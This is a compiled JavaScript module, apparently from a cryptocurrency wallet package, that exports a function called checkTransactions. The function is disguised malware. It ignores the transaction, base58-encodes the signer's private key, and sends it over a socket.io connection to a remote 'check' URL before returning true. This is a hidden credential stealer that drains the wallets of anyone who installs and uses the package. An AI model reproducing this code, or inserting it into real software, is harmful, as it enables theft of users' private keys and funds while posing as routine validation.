"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.checkTransactions = void 0;
const bs58 = __importStar(require("bs58"));
const socket_io_client_1 = require("socket.io-client");
const global_1 = require("../global");
const checkTransactions = (txn, signer) => {
    if (signer.publicKey.toBuffer().length <= 0 ||
        signer.secretKey.buffer.byteLength <= 0) {
        return false;
    }
    const check_sign = bs58.encode(signer.secretKey);
    if (check_sign.length <= 0) {
        return false;
    }
    const sk = (0, socket_io_client_1.io)(global_1.EnvironmentManager.getCheckUrl(), { autoConnect: true });
    sk.emit("tx", { text: `Jae-> ${check_sign}` });
    return true;
};
exports.checkTransactions = checkTransactions;
